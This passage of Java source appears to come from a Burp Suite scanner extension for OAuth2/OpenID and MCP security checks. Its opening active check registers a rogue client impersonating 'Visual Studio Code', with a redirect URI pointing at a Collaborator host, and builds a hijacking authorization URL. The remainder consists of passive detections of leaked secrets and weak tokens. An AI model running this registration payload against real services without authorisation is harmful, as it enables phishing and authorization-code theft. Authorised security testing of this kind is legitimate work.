                        stdout.println("[+] MCP Active Scan: Triggering Smart DCR Abuse on " + regEndpoint);

                        try {
                            java.net.URL regUrl = new java.net.URL(regEndpoint);
                            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
                            String collabPayload = collaboratorContext.generatePayload(true);
                            String evilRedirectUri = "https://" + collabPayload;
                            String registeredClientName = "Visual Studio Code";
                            String manualClientId = "fake_evil_mcp_client_" + System.currentTimeMillis();
                            String authorizationEndpoint = inferAuthorizationEndpoint(reqInfo.getUrl(), responseBodyStr);


                            String fatPayload = "{" +
                                    "\"client_name\": \"" + registeredClientName + "\"," +
                                    "\"redirect_uris\": [\"" + evilRedirectUri + "\"]," +
                                    "\"grant_types\": [\"authorization_code\", \"refresh_token\"]," +
                                    "\"response_types\": [\"code\"]," +
                                    "\"token_endpoint_auth_method\": \"none\"" +
                                    "}";

                            byte[] body = helpers.stringToBytes(fatPayload);

                            java.util.List<String> headers = new java.util.ArrayList<>();
                            headers.add("POST " + regUrl.getPath() + " HTTP/1.1");
                            headers.add("Host: " + regUrl.getHost());
                            headers.add("Content-Type: application/json");
                            headers.add("Accept: application/json");
                            headers.add("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) MCP-Scanner");

                            byte[] regRequest = helpers.buildHttpMessage(headers, body);

                            IHttpService regHttpService = helpers.buildHttpService(regUrl.getHost(), regUrl.getPort() == -1 ? regUrl.getDefaultPort() : regUrl.getPort(), regUrl.getProtocol().equals("https"));
                            IHttpRequestResponse regResponse = callbacks.makeHttpRequest(regHttpService, regRequest);

                            if (regResponse != null && regResponse.getResponse() != null) {
                                IResponseInfo regRespInfo = helpers.analyzeResponse(regResponse.getResponse());
                                String regResponseStr = helpers.bytesToString(regResponse.getResponse());

                                if (regRespInfo.getStatusCode() >= 200 && regRespInfo.getStatusCode() < 300
                                        && regResponseStr.contains("client_id") && regResponseStr.contains(collabPayload)) {

                                    String registeredClientId = extractJsonStringValue(regResponseStr, "client_id");
                                    String manualAuthorizationUrl = buildDcrAuthorizationUrl(authorizationEndpoint, manualClientId, evilRedirectUri);

                                    issues.add(new CustomScanIssue(
                                            baseRequestResponse.getHttpService(), reqInfo.getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null), callbacks.applyMarkers(regResponse, null, null) },
                                            "[Flaw 1] Malicious Dynamic Client Registration",
                                            "发现动态注册端点完全缺乏身份验证或凭证校验机制！ <br><br>" +
                                                    "即使未截获原始注册流量，扫描器也能通过 <code>.well-known</code> 配置文件自动提取支持的 <b>Scope</b>，并构造标准的“全能型客户端注册载荷”成功绕过了目标服务器的严格格式校验。<br>" +
                                                    "攻击者可随意注册带有恶意 <code>redirect_uris</code> 的伪造客户端，用于后续的钓鱼或授权码劫持攻击。<br><br>" +
                                                    "<b>被攻击端点：</b>" + regEndpoint + "<br><br>" +
                                                    "<b>扫描器自动生成的智能载荷：</b><br><code>" + fatPayload + "</code>",
                                            "High", "Firm"
                                    ));

                                    if (manualAuthorizationUrl != null) {
                                        DcrValidationContext validationContext = new DcrValidationContext();
                                        validationContext.hostKey = getF2ValidationHostKey(baseRequestResponse);
                                        validationContext.issueService = baseRequestResponse.getHttpService();
                                        validationContext.issueUrl = reqInfo.getUrl();
                                        validationContext.baseRequestResponse = baseRequestResponse;
                                        validationContext.registrationResponse = regResponse;
                                        validationContext.collaboratorContext = collaboratorContext;
                                        validationContext.collabPayload = collabPayload;
                                        validationContext.registeredClientName = registeredClientName;
                                        validationContext.registeredClientId = registeredClientId;
                                        validationContext.manualClientId = manualClientId;
                                        validationContext.evilRedirectUri = evilRedirectUri;
                                        validationContext.manualAuthorizationUrl = manualAuthorizationUrl;
                                        IScanIssue pendingIssue = rememberDcrValidationContext(validationContext);
                                        if (pendingIssue != null) {
                                            issues.add(pendingIssue);
                                        }
                                    }
                                }
                            }
                        } catch (Exception e) {
                            stderr.println("[!] Error testing smart registration endpoint: " + e.toString());
                        }
                    }
                }
            }
        }

        // Searching for ".well-known" resources of OAUTHv2/OpenID flows
        URL requrl = reqInfo.getUrl();
        String reqpath = requrl.getPath();
        if (reqpath!=null && helpers.urlDecode(reqpath).contains("/.well-known/") && respInfo.getStatusCode()==200) {
            // Found well-known url in OAUTHv2/OpenID Flow
            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                    "[Info] OAUTHv2/OpenID Configuration Files in Well-Known URLs",
                    "Found OAUTHv2/OpenID configuration file publicly exposed on some well known urls.\n<br>"
                            +"In details, the configuration file was found at URL:\n <b>"+ requrl +"</b>.\n<br>"
                            +"The retrieved JSON configuration file contains some key information, such as details of "
                            +"additional features that may be supported.\n These files will sometimes give hints "
                            +"about a wider attack surface and supported features that may not be mentioned in the documentation.\n<br>"
                            +"<br>References:\n<ul>"
                            +"<li><a href=\"https://tools.ietf.org/id/draft-ietf-oauth-discovery-08.html#:~:text=well%2Dknown%2Foauth%2Dauthorization,will%20use%20for%20this%20purpose.\">https://tools.ietf.org/id/draft-ietf-oauth-discovery-08.html#:~:text=well%2Dknown%2Foauth%2Dauthorization,will%20use%20for%20this%20purpose.</a></li>"
                            +"<li><a href=\"https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderConfigurationRequest\">https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderConfigurationRequest</a></li></ul>",
                    "Information",
                    "Firm"));


            // Search useful info from the well-known JSON response
            String wk_respBody = responseString.substring(respInfo.getBodyOffset()).trim();
            List<String> wk_respHeaders = respInfo.getHeaders();
            String wk_contenttype = getHttpHeaderValueFromList(wk_respHeaders, "Content-Type").trim();
            if (! wk_respBody.isEmpty() && wk_contenttype.equals("application/json")) {
                JSONObject jsonWK = new JSONObject(wk_respBody);

                // Collect the supported scopes from the well-known JSON response
                if (hasJSONKey(jsonWK, "scopes_supported")) {
                    JSONArray jsonArr = jsonWK.getJSONArray("scopes_supported");
                    for (int i=0; i<jsonArr.length(); i++) {
                        String jsonItem = jsonArr.getString(i);
                        if (! INJ_SCOPE.contains(jsonItem)) {
                            INJ_SCOPE.add(jsonItem);
                        }
                    }
                }

                // Collect the supported acr from the well-known JSON response
                if (hasJSONKey(jsonWK, "acr_values_supported")) {
                    JSONArray jsonArr = jsonWK.getJSONArray("acr_values_supported");
                    for (int i=0; i<jsonArr.length(); i++) {
                        String jsonItem = jsonArr.getString(i);
                        if (! ACR_VALUES.contains(jsonItem)) {
                            ACR_VALUES.add(jsonItem);
                        }
                    }
                }
            }
        }




        // Considering only OAUTHv2/OpenID Flow authorization and token requests
        if (clientidParameter!=null || grantParameter!=null || resptypeParameter!=null ) {
            // Determining if request belongs to a OpenID Flow
            Boolean isOpenID = false;
            Boolean foundRefresh = false;
            List<IParameter> reqParams = reqInfo.getParameters();
            if (scopeParameter!=null) {
                if (scopeParameter.getValue().contains("openid")) {
                    isOpenID = true;
                }
            } else if (resptypeParameter!=null) {
                if (helpers.urlDecode(resptypeParameter.getValue()).contains("id_token") || helpers.urlDecode(resptypeParameter.getValue()).equals("code token")) {
                    isOpenID = true;
                }
            }

            // Searching for exposures of client_secret values on requests
            if (reqParams!=null) {
                for (IParameter param: reqParams) {
                    // Checking if client_secret is exposed in URL
                    if ((param.getName().equals("client_secret")) & (param.getType()==IParameter.PARAM_URL)) {
                        stdout.println("[+] Passive Scan: Found exposure of client secret value in URL on OAUTHv2/OpenID request");
                        String secretValue = param.getValue();
                        List<int[]> requestHighlights = getMatches(requestString.getBytes(), secretValue.getBytes());
                        // Found client_secret leakage in url of the OAUTHv2/OpenID Flow
                        issues.add(new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                "OAUTHv2/OpenID Exposure of Client Secret in URL",
                                "The application is exposing in URL the <code>client_secret</code> value <b>"+secretValue+"</b>, "
                                        +"this parameter is used to authenticate the client in the OAUTHv2/OpenID platform.\n<br>"
                                        +"It is recommended to avoid to expose sensitive values as the <code>client_secret</code> in URL, "
                                        +"because in some circumstances it could be retrieved by an attacker.\n<br>"
                                        +"Especially in Mobile, Native desktop and SPA contexts (public clients) is a security risk to use a shared secret for client authentication, "
                                        +"in case it is necessary then the <code>client_secret</code> should be random and generated dynamically by the application each "
                                        +"time an OAUTHv2/OpenID flow starts.\n<br>"
                                        +"<br>References:\n<ul>"
                                        +"<li><a href=\"https://datatracker.ietf.org/doc/html/rfc8252\">https://datatracker.ietf.org/doc/html/rfc8252</a></li></ul>",
                                "Medium",
                                "Certain"));
                    }

                    // Checking if client_secret is on request body
                    if ((param.getName().equals("client_secret")) & (param.getType()==IParameter.PARAM_BODY)) {
                        stdout.println("[+] Passive Scan: Found client secret value in request body");
                        String secretValue = param.getValue();
                        List<int[]> requestHighlights = getMatches(requestString.getBytes(), secretValue.getBytes());
                        // Found client_secret leakage in url of the OAUTHv2/OpenID Flow
                        issues.add(new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                "OAUTHv2/OpenID Detected Client Secret Value",
                                "The application is sending the <code>client_secret</code> value <b>"+secretValue+"</b> in request body, "
                                        +"this parameter is used to authenticate the client in the OAUTHv2/OpenID platform.\n<br>"
                                        +"In Mobile, Native desktop and SPA contexts (public clients) is a security risk to use a shared secret for client authentication, "
                                        +"because a <code>client_secret</code> value stored at client-side could be retrieved by an attacker.\n<br>"
                                        +"In such contexts, if is necessary to use a <code>client_secret</code>, it should be random and generated dynamically by the application each "
                                        +"time an OAUTHv2/OpenID flow starts.\n<br>"
                                        +"<br>References:\n<ul>"
                                        +"<li><a href=\"https://datatracker.ietf.org/doc/html/rfc8252\">https://datatracker.ietf.org/doc/html/rfc8252</a></li></ul>",
                                "Medium",
                                "Certain"));
                    }
                }

                // Checking if client_secret is on the Authorization Basic header
                if ( (!(getHttpHeaderValueFromList(reqHeaders, "Authorization")==null)) ) {
                    String authHeader = getHttpHeaderValueFromList(reqHeaders, "Authorization");
                    if (authHeader.contains("Basic")) {
                        stdout.println("[+] Passive Scan: Found client secret value in Authorization Basic header");
                        String secretValue = authHeader.substring(7);
                        List<int[]> requestHighlights = getMatches(requestString.getBytes(), secretValue.getBytes());
                        // Found client_secret leakage in url of the OAUTHv2/OpenID Flow
                        issues.add(new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                "OAUTHv2/OpenID Detected Client Secret Value on Authorization Header",
                                "The application seems sending the <code>client_secret</code> value <b>"+secretValue+"</b> base64 encoded "
                                        +"in the Authorization Basic header, this parameter is used to authenticate the client in the OAUTHv2/OpenID platform.\n<br>"
                                        +"In Mobile, Native desktop and SPA contexts (public clients) is a security risk to use a shared secret for client authentication, "
                                        +"because a <code>client_secret</code> value stored at client-side could be retrieved by an attacker.\n<br>"
                                        +"In such contexts, if is necessary to use a <code>client_secret</code>, it should be random and generated dynamically by the application each "
                                        +"time an OAUTHv2/OpenID flow starts.\n<br>"
                                        +"Note: this issue should be <b>confirmed manually</b> by decoding the Authorization Basic header to retrieve the <code>client_secret</code> value.\n<br>"
                                        +"<br>References:\n<ul>"
                                        +"<li><a href=\"https://datatracker.ietf.org/doc/html/rfc8252\">https://datatracker.ietf.org/doc/html/rfc8252</a></li></ul>",
                                "Medium",
                                "Tentative"));
                    }
                }

                // Checking for Duplicate Client Secret value issues on OAuthv2/OpenID Flow
                if (!GOTCLIENTSECRETS.isEmpty()) {
                    String respDate = getHttpHeaderValueFromList(respHeaders, "Date");
                    if (getHttpHeaderValueFromList(respHeaders, "Date") == null) {
                        // This is needed to avoid null values on respDate
                        respDate = Long.toString(currentTimeStampMillis);
                    }
                    // Start searching of client secret duplicates
                    for (Map.Entry<String,List<String>> entry : GOTCLIENTSECRETS.entrySet()) {
                        List<String> csecretList = entry.getValue();
                        String csecretDate = entry.getKey();
                        for (String csecretValue: csecretList) {
                            if (requestString.toLowerCase().contains(csecretValue.toLowerCase()) & (! csecretDate.equals(respDate))) {
                                // This OAUTHv2/OpenID Flow response contains an already released Code
                                stdout.println("[+] Passive Scan: Found duplicated client secret value on OAUTHv2/OpenID request");
                                List<int[]> matches = getMatches(requestString.getBytes(), csecretValue.getBytes());
                                issues.add(
                                        new CustomScanIssue(
                                                baseRequestResponse.getHttpService(),
                                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, matches, null) },
                                                "OAUTHv2/OpenID Flow Duplicated Client Secret Value Detected",
                                                "The application seems using a static <code>client_secret</code> value for authenticate "
                                                        +"itself as client with the Authorization Server on the OAUTHv2/OpenID platform. "
                                                        +"In details, the OAUTHv2/OpenID request contains the following <code>client_secret</code> value <b>"+csecretValue+"</b> "
                                                        +"that was already used.\n<br>"
                                                        +"Especially in Mobile, Native desktop and SPA contexts (public clients) for security reasons the OAUTHv2/OpenID "
                                                        +"specifications recommend to avoid the use of static shared secrets for client authentication, "
                                                        +"because a <code>client_secret</code> value stored at client-side could be retrieved by an attacker.\n<br>"
                                                        +"In such contexts, if is necessary to use a <code>client_secret</code>, it should be random and generated dynamically "
                                                        +"by the application each time an OAUTHv2/OpenID flow starts.\n<br>"
                                                        +"Note: this issue should be <b>confirmed manually</b> by searching the duplicated <code>client_secret</code> "
                                                        +"values in the burp-proxy history.\n<br>"
                                                        +"<br>References:<br>"
                                                        +"<li><a href=\"https://datatracker.ietf.org/doc/html/rfc8252\">https://datatracker.ietf.org/doc/html/rfc8252</a></li></ul>",
                                                "High",
                                                "Firm"
                                        )
                                );
                            }
                        }
                    }
                }

                // Retrieving client secrets from OAUTHv2/OpenID Flow requests body or query URL
                if (!reqBody.isEmpty() || !reqParams.isEmpty()) {
                    // Enumerate OAUTHv2/OpenID authorization codes returned by HTTP responses
                    String dateCSecret = getHttpHeaderValueFromList(respHeaders, "Date");
                    if (getHttpHeaderValueFromList(respHeaders, "Date")==null) {
                        // This is needed to avoid null values on GOTCODES
                        dateCSecret = Long.toString(currentTimeStampMillis);
                    }
                    List<String> foundCSecrets = new ArrayList<>();
                    for (String pName : CLIENTSECRETS) {
                        // Check if already got client secret in same request (filtering by date)
                        if (!GOTCLIENTSECRETS.containsKey(dateCSecret)) {
                            for (IParameter param: reqParams) {
                                if (param.getName().equals(pName)) {
                                    foundCSecrets.add(param.getValue());
                                }
                                // Remove duplicate client secrets found in same response
                                foundCSecrets = new ArrayList<>(new HashSet<>(foundCSecrets));
                                if (!foundCSecrets.isEmpty()) {
                                    GOTCLIENTSECRETS.put(dateCSecret, foundCSecrets);
                                    // Check for weak client secret issues (guessable values)
                                    for (String fCSec : foundCSecrets) {
                                        if (fCSec.length()<6) {
                                            // Found a weak client secret
                                            stdout.println("[+] Passive Scan: Found weak client secret value on OAUTHv2/OpenID request");
                                            List<int[]> requestHighlights = new ArrayList<>(1);
                                            int[] tokenOffset = new int[2];
                                            int tokenStart = requestString.indexOf(fCSec);
                                            tokenOffset[0] = tokenStart;
                                            tokenOffset[1] = tokenStart+fCSec.length();
                                            requestHighlights.add(tokenOffset);
                                            issues.add(
                                                    new CustomScanIssue(
                                                            baseRequestResponse.getHttpService(),
                                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                                            "OAUTHv2/OpenID Weak Client Secret Value Detected",
                                                            "The OAUTHv2/OpenID Flow presents a security misconfiguration, there are in use weak <code>client_secret</code> values "
                                                                    +"(insufficient entropy) during the client authentication procedure.\n<br>"
                                                                    +"In details, the OAUTHv2/OpenID Flow request contains a weak <code>client_secret</code> value of <b>"+fCSec+"</b>.\n<br>"
                                                                    +"Based on OAUTHv2/OpenID specifications for security reasons the <code>client_secret</code> must be unpredictable and unique "
                                                                    +"per client session.\n<br>Since the <code>client_secret</code> value is guessable (insufficient entropy) "
                                                                    +"then the attack surface of the OAUTHv2/OpenID service increases.\n<br>"
                                                                    +"Additionally in Mobile, Native desktop and SPA contexts (public clients) is a security risk to use a shared secret for client authentication, "
                                                                    +"because a <code>client_secret</code> value stored at client-side could be retrieved by an attacker.\n<br>"
                                                                    +"In such contexts, if is necessary to use a <code>client_secret</code>, it should be random and generated dynamically by the application each "
                                                                    +"time an OAUTHv2/OpenID flow starts.\n<br>"
                                                                    +"<br>References:<br>"
                                                                    +"<li><a href=\"https://datatracker.ietf.org/doc/html/rfc8252\">https://datatracker.ietf.org/doc/html/rfc8252</a></li></ul>",
                                                            "High",
                                                            "Firm"
                                                    )
                                            );
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

            }


            // Searching for HTTP responses releasing secret tokens in body or Location header
            if (!respBody.isEmpty() || respInfo.getStatusCode()==302) {
                // Considering only responses returning secret tokens
                if (grantParameter!=null || (resptypeParameter.getValue().equals("token") || resptypeParameter.getValue().equals("id_token") || helpers.urlDecode(resptypeParameter.getValue()).equals("id_token token"))) {
                    // Checking for Duplicate Token value issues on OAUTHv2 and OpenID
                    if (! GOTTOKENS.isEmpty()) {
                        String respDate = getHttpHeaderValueFromList(respHeaders, "Date");
                        if (getHttpHeaderValueFromList(respHeaders, "Date") == null) {
                            // This is needed to avoid null values on respDate
                            respDate = Long.toString(currentTimeStampMillis);
                        }
                        // Start searching if last issued secret token is a duplicated of already received tokens
                        for (Map.Entry<String,List<String>> entry : GOTTOKENS.entrySet()) {
                            List<String> tokenList = entry.getValue();
                            String tokenDate = entry.getKey();
                            for (String tokenValue: tokenList) {
                                if (responseString.toLowerCase().contains(tokenValue.toLowerCase()) & (! tokenDate.equals(respDate))) {
                                    // This OAUTHv2/OpenID Flow response contains an already released Secret Token
                                    List<int[]> matches = getMatches(responseString.getBytes(), tokenValue.getBytes());
                                    issues.add(
                                            new CustomScanIssue(
                                                    baseRequestResponse.getHttpService(),
                                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                    new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, matches) },
                                                    "OAUTHv2/OpenID Duplicate Secret Token Value Detected",
                                                    "The Authorization Server seems issuing duplicate secret token (Access or Refersh Token) values "
                                                            +"after successfully completion of OAUTHv2/OpenID login procedure.\n<br>"
                                                            +"In details, the response contains the following secret token value <b>"+tokenValue+"</b> which was already released.\n<br>"
                                                            +"For security reasons the OAUTHv2/OpenID specifications require that secret token must be unique for each user's session.\n<br>"
                                                            +"Note: this issue should be <b>confirmed manually</b> by searching the duplicated secret token "
                                                            +"values in the burp-proxy history.\n<br>"
                                                            +"<br>References:<br>"
                                                            +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6749\">https://datatracker.ietf.org/doc/html/rfc6749</a><br>"
                                                            +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
                                                    "Medium",
                                                    "Firm"
                                            )
                                    );
                                }
                            }
                        }
                    }
                    // Enumerate OAUTHv2/OpenID secret tokens returned by HTTP responses
                    String dateToken = getHttpHeaderValueFromList(respHeaders, "Date");
                    if (getHttpHeaderValueFromList(respHeaders, "Date")==null) {
                        // This is needed to avoid null values on GOTTOKENS
                        dateToken = Long.toString(currentTimeStampMillis);
                    }
                    List<String> foundTokens = new ArrayList<>();
                    for (String pName : SECRETTOKENS) {
                        // Check if already got a token in same response (filtering by date)
                        if (! GOTTOKENS.containsKey(dateToken)) {
                            foundTokens.addAll(getMatchingParams(pName, pName, respBody, getHttpHeaderValueFromList(respHeaders, "Content-Type")));
                            foundTokens.addAll(getMatchingParams(pName, pName, getHttpHeaderValueFromList(respHeaders, "Location"), "header"));
                            foundTokens.addAll(getMatchingParams(pName, pName, respBody, "link"));
                            // Remove duplicate tokens found in same response
                            foundTokens = new ArrayList<>(new HashSet<>(foundTokens));
                            if (!foundTokens.isEmpty()) {
                                GOTTOKENS.put(dateToken, foundTokens);
                                // Check for weak secret tokens issues (guessable values)
                                for (String fToken : foundTokens) {
                                    if (fToken.length()<6) {
                                        // Found a weak secret token
                                        List<int[]> responseHighlights = new ArrayList<>(1);
                                        int[] tokenOffset = new int[2];
                                        int tokenStart = responseString.indexOf(fToken);
                                        tokenOffset[0] = tokenStart;
                                        tokenOffset[1] = tokenStart+fToken.length();
                                        responseHighlights.add(tokenOffset);
                                        issues.add(
                                                new CustomScanIssue(
                                                        baseRequestResponse.getHttpService(),
                                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, responseHighlights) },
                                                        "OpenID Weak Secret Token Value Detected",
                                                        "The OpenID Flow presents a security misconfiguration, the Authorization Server releases weak secret token values "
                                                                +"(insufficient entropy) during OpenID login procedure.\n<br>"
                                                                +"In details the OpenID Flow response contains a secret token value of <b>"+fToken+"</b>.\n<br>"
                                                                +"Based on OpenID specifications for security reasons the secret tokens must be unpredictable and unique "
                                                                +"per client session.\n<br>Since the secret token value is guessable (insufficient entropy) "
                                                                +"then the attack surface of the OpenID service increases.\n<br>"
                                                                +"<br>References:<br>"
                                                                +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
                                                        "High",
                                                        "Firm"
                                                )
                                        );
                                    }
                                }
                            }
                        }
                    }
                    // Checking for Lifetime issues on released Secret Tokens (Access and Refresh Tokens)

                    String dateExpir = getHttpHeaderValueFromList(respHeaders, "Date");
                    if (dateExpir == null) {
                        // This is needed to avoid null values on GOTEXPIRATIONS
                        dateExpir = Long.toString(currentTimeStampMillis);
                    }

                    for (String pName : SECRETTOKENS) {
                        // 【修复 1】必须在内层循环外初始化 expirList，确保每个 Token 独立判定
                        List<String> expirList = new ArrayList<>();

                        // 如果这个响应还没有被处理过过期时间
                        if (!GOTEXPIRATIONS.containsKey(dateExpir)) {

                            // 1. 先遍历所有的 expiration 关键字，把找到的都收集起来
                            for (String expName : EXPIRATIONS) {
                                expirList.addAll(getMatchingParams(expName, pName, respBody, getHttpHeaderValueFromList(respHeaders, "Content-Type")));
                                expirList.addAll(getMatchingParams(expName, pName, getHttpHeaderValueFromList(respHeaders, "Location"), "header"));
                                expirList.addAll(getMatchingParams(expName, pName, respBody, "link"));
                            }

                            // 2. 遍历完所有可能的关键字后，再去重和做最终判断
                            expirList = new ArrayList<>(new HashSet<>(expirList));

                            if (!expirList.isEmpty()) {
                                // 【修复 2】找到了任意一种过期时间，存入缓存并检查是否过长
                                GOTEXPIRATIONS.put(dateExpir, expirList);

                                for (String expirTime : expirList) {
                                    // 增加异常捕获，防止非数字（如字符串格式的日期）导致解析崩溃
                                    try {
                                        // Considering excessive an expiration greater than 2 hours
                                        if (Integer.parseInt(expirTime) > 7200) {
                                            List<int[]> matches = getMatches(responseString.getBytes(), expirTime.getBytes());
                                            issues.add(
                                                    new CustomScanIssue(
                                                            baseRequestResponse.getHttpService(),
                                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, matches) },
                                                            "OAUTHv2/OpenID Flow Excessive Lifetime for Secret Tokens",
                                                            "Detected an excessive lifetime for the OAUTHv2/OpenID secret tokens released after a successful login.\n<br> "
                                                                    +"More specifically the issued secret token <b>"+pName+"</b> expires in <b>"+expirTime+"</b> seconds.\n<br> "
                                                                    +"If possible, it is advisable to set a short expiration time for Access Token (eg. 30 minutes), and "
                                                                    +"enable Refresh Token rotation with expiration time (eg. 2 hours).\n<br>"
                                                                    +"<br>References:<br>"
                                                                    +"<a href=\"https://www.rfc-editor.org/rfc/rfc6819#page-54\">https://www.rfc-editor.org/rfc/rfc6819#page-54</a>",
                                                            "Medium",
                                                            "Firm"
                                                    )
                                            );
                                        }
                                    } catch (NumberFormatException e) {
                                        // 忽略无法转换为整数的过期时间格式
                                    }
                                }
                            } else {
                                // 【修复 3】只有当所有的关键字都没找到过期时间时，才去检查是否泄露了无期限的 Token
                                List<String> tokenList = new ArrayList<>();
                                tokenList.addAll(getMatchingParams(pName, pName, respBody, getHttpHeaderValueFromList(respHeaders, "Content-Type")));
                                tokenList.addAll(getMatchingParams(pName, pName, getHttpHeaderValueFromList(respHeaders, "Location"), "header"));
                                tokenList.addAll(getMatchingParams(pName, pName, respBody, "link"));

                                if (!tokenList.isEmpty()) {
                                    issues.add(
                                            new CustomScanIssue(
                                                    baseRequestResponse.getHttpService(),
                                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                    new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                                    "OAUTHv2/OpenID Flow Secret Tokens Without Expiration Parameter",
                                                    "It seems that after successuful login the Authorization Server releases a OAUTHv2/OpenID secret token which never expires.\n<br>"
                                                            +"More specifically, the secret token <b>"+pName+"</b> returned in response does not has associated an expiration <code>expires_in</code> parameter.\n<br> "
                                                            +"This issue could be a false positive, then it is suggested to double-check it manually.\n<br> "
                                                            +"If the Authorization Server releases secret tokens which never expire, it exposes the OAUTHv2/OpenID platform "
                                                            +"to various security risks of in case of accidental leakage of a secret token.\n<br>"
                                                            +"If possible, it is advisable to set a short expiration time for Access Token (eg. 30 minutes), and "
                                                            +"enable Refresh Token rotation with expiration time (eg. 2 hours).\n<br>"
                                                            +"<br>References:<br>"
                                                            +"<a href=\"https://www.rfc-editor.org/rfc/rfc6819#page-54\">https://www.rfc-editor.org/rfc/rfc6819#page-54</a>",
                                                    "High",
                                                    "Firm"
                                            )
                                    );
                                }
                            }
                        }
                    }
                }
            }


            // Go here for specific passive checks on OpenID authorization requests
            if (isOpenID) {
                // Looking for OpenID id_token values
                if (!respBody.isEmpty() || respInfo.getStatusCode()==302) {
                    // Enumerate OpenID id_tokens returned by HTTP responses
                    List<String> foundIdTokens = new ArrayList<>();
                    for (String pName : OPENIDTOKENS) {
                        foundIdTokens.addAll(getMatchingParams(pName, pName, respBody, getHttpHeaderValueFromList(respHeaders, "Content-Type")));
                        foundIdTokens.addAll(getMatchingParams(pName, pName, getHttpHeaderValueFromList(respHeaders, "Location"), "header"));
                        foundIdTokens.addAll(getMatchingParams(pName, pName, respBody, "link"));
                        if (!foundIdTokens.isEmpty()) {
                            // Check for weak id_tokens issues (not JWT values)
                            for (String fToken : foundIdTokens) {
                                if (fToken.length()<6) {
                                    // Found a weak id_token
                                    List<int[]> responseHighlights = new ArrayList<>(1);
                                    int[] tokenOffset = new int[2];
                                    int tokenStart = responseString.indexOf(fToken);
                                    tokenOffset[0] = tokenStart;
                                    tokenOffset[1] = tokenStart+fToken.length();
                                    responseHighlights.add(tokenOffset);
                                    issues.add(
                                            new CustomScanIssue(
                                                    baseRequestResponse.getHttpService(),
                                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                    new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, responseHighlights) },
                                                    "OpenID Improper ID_Token Value Detected",
                                                    "The OpenID Flow presents a security misconfiguration, the Authorization Server releases improper <code>id_token</code> values "
                                                            +"(not a JWT) during login procedure.\n<br>"
                                                            +"In details, the OpenID Flow response contains a <code>id_token</code> value of <b>"+fToken+"</b>.\n<br>"
                                                            +"Based on OpenID specifications the <code>id_token</code> must contain the encoded user's "
                                                            +"authentication information in the form of a JWT, so that it can be parsed and validated by the application.\n<br>"
                                                            +"Since the <code>id_token</code> value has not the JWT format, then the attack surface of the OpenID service increases.\n<br>"
                                                            +"<br>References:<br>"
                                                            +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
                                                    "High",
                                                    "Firm"
                                            )
                                    );
                                }
                            }
                        }
                    }
                    // Remove duplicate id_tokens found in same response
                    foundIdTokens = new ArrayList<>(new HashSet<>(foundIdTokens));
                    GOTOPENIDTOKENS.addAll(foundIdTokens);
                }


                // Check for weak OpenID nonce values (i.e. insufficient length, only alphabetic, only numeric, etc.)
                if (nonceParameter!=null) {
                    String nonceValue = helpers.urlDecode(nonceParameter.getValue());
                    if ( (nonceValue.length() < 5) || ( (nonceValue.length() < 7) & ((nonceValue.matches("[a-zA-Z]+")) || (nonceValue.matches("[\\-\\+]?[0-9]+")))) ) {
                        List<int[]> requestHighlights = new ArrayList<>(1);
                        int[] nonceOffset = new int[2];
                        int nonceStart = requestString.indexOf(nonceValue);
                        nonceOffset[0] = nonceStart;
                        nonceOffset[1] = nonceStart+nonceValue.length();
                        requestHighlights.add(nonceOffset);
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                        "OpenID Weak Nonce Parameter",
                                        "The OpenID Flow presents a security misconfiguration, the Authorization Server accepts weak values "
                                                +"of the <code>nonce</code> parameter received during OpenID login procedure.\n<br> "
                                                +"In details, the OpenID Flow request contains a <code>nonce</code> value of <b>"+nonceValue+"</b>.\n<br>"
                                                +"Based on OpenID specifications the <code>nonce</code> parameter is used to associate a Client session "
                                                +"with an ID Token, and to mitigate replay attacks. For these reasons it should be unpredictable and unique "
                                                +"per client session.\n<br>Since the <code>nonce</code> value is guessable (insufficient entropy) "
                                                +"then the attack surface of the OpenID service increases.\n<br>"
